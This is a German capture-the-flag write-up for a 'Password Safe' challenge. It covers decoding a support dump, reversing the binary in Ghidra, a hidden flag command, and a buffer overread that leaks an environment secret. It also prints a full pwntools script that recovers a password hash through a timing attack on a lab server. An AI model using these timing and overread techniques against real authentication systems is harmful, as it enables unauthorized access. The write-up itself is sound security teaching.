# Password Safe

> A student group developed a new tool in a seminar, which is now being used by the admins at the HackHigh institute. But the students say that this software was never intended to be in production use...

Ein Passwort Safe also, bei dem wir erstmal nicht viel ausrichten können. Leider gibt es auch (vorerst) kein Binary zum lokalen Testen. Warum also nicht erstmal um support bitten? Das support Feature spuckt einen langen, scheibar base64 kodierten Text aus, den ich erstmal in [CyberChef](https://gchq.github.io/CyberChef) kopiert habe.

Die erste Zeile ist auch tatsächlich lesbar: aber was ist der Rest? Da die erste Zeile sagt, dass es sich um eine Datei handelt, habe ich den Output (ohne die erste Zeile) als Datei gespeichert. Dabei ist ein erster Blick auf die ersten Zeichen der Datei interessant. Wenn man das googelt, stößt man schnell darauf, dass es sich dabei um die Signatur von Bzip2 handelt. Cyberchef schlägt beim Speichern auch direkt `.bz2` als Endung vor.

Entpackt finden wir darun einen keysafe-debug Ordner mit interessanten Dateien. Neben der ersten Flag in der Datei `license` befindet sich hier auch das Binary der Challenge, das sich jetzt in Ghidra zur weiteren Analyse laden lässt.

In der Funktion `react()` werden die Eingaben verwaltet. Hier fällt auf, dass es neben den im Hilfe-Text angegebenen Kommandos help, authenticate (wobei auth anscheinend reicht), get-keys, support, architecture und exit auch noch die Kommandos `fl4g-obfuscate` und `fl4g` gibt. Letzteres liefert und auch unauthentisiert die zweite Flag.

Noch eine Flag ist unauthentisiert erreichbar. Der User-Input, der keine festgelegte Länge hat, wird in einen buffer der Länge 102 kopiert und anschließend wird bis zum 818. Zeichen jeder Zeilenumbruch/Return durch 0 ersetzt. Im Anschluss wird die Server-Status Flag aus den Umgebungsvariablen geladen. Wenn jetzt der Input aber bis zum 818. Zeichen keinen Zeilenumbruch oder Return drin hat, werden bei der anschließenden Ausgabe von `Command <mein-input> not recognized.` auch die anschließenden Zeichen, also die Flag ausgegeben.

Jetzt wird es aber wirklich Zeit, sich auch mal anzumelden bei dem Key Safe. Aber wie? Hier habe ich lange auf die Funktion `equal_hashes()` gestarrt, bis es mir plötzlichaufgefallen ist:

Der Hash wird Zeichen für Zeichen verglichen. Bei Ungleichheit wird 4 Millisekunden geschlafen. Je mehr Zeichen also korrekt sind, desto kürzer dauert der Vergleich. Das lässt sich für eine Timing-Attacke ausnutzen. Ich habe dafür ein Script geschrieben, das erst einmal ein paar zufällig erzeugte 64 Zeichen lange Passwörter ausprobiert und davon das mit der kürzesten Startzeit als Ausgangspunkt nimmt. So ist die Gesamtlaufzeit schon zu Beginn ein wenig optimiert.

Anschließend wird Zeichen für Zeichen je 10 mal durchiteriert und das Zeichen ausgewählt, das am häufigsten die kürzeste Ausführungszeit zur Folge hatte.

```python
#! /bin/python3

from pwn import *
from time import time
import random

context.log_level = 'critical'

chars = "abcdefABCDEF0123456789"

def test_password(pw):
	conn = remote('10.65.56.105',1337)

	r = conn.recvuntil(b'What can I do for you today? ')
	conn.sendline(b'auth')
	r = conn.recvuntil(b'Hashed-Password: ')
	
	start = time()
	conn.sendline(pw.encode())
	r = conn.recv()
	end = time()
	duration = end-start
	
	conn.close()
	return duration

best_choice = [5, 'x']

for i in range(20):
	pw_list = random.choices(chars, k=64)
	pw = ''.join(pw_list)
	duration = test_password(pw)
	if duration < best_choice[0]:
		best_choice[0] = duration
		best_choice[1] = pw

print(best_choice)

pw = best_choice[1]
pw_list = list(pw)

for i in range(64):
	smallest = []

	for j in range(10):

		local_smallest = [5, 'x']
		for c in chars:
			
			pw_list[i] = c
			pw = ''.join(pw_list)
			
			duration = test_password(pw)
			
			if (duration < local_smallest[0]):
				local_smallest[0] = duration
				local_smallest[1] = c 
		print(local_smallest)
		smallest.append(local_smallest[1])

	found = max(set(smallest), key = smallest.count)
	print('Found: ', i, found, smallest)
	pw_list[i] = found

print('Hash: ', ''.join(pw_list))		
```

Das Script habe ich zweimal laufen lassen, da der erste Versuch noch nicht den (komplett) richtigen Hash geliefert hat. Die beiden Ergebnisse haben sich nur an wenigen Stellen unterschieden, so dass ich das Script nochmal in abgewandelter Form für ein Finetuning an den entsprechenden Stellen laufen lassen konnte. Das Ergebnis war der richtige Hashwert und zur Belohnung die vierte Flag nach der Authentisierung beim Keysafe.
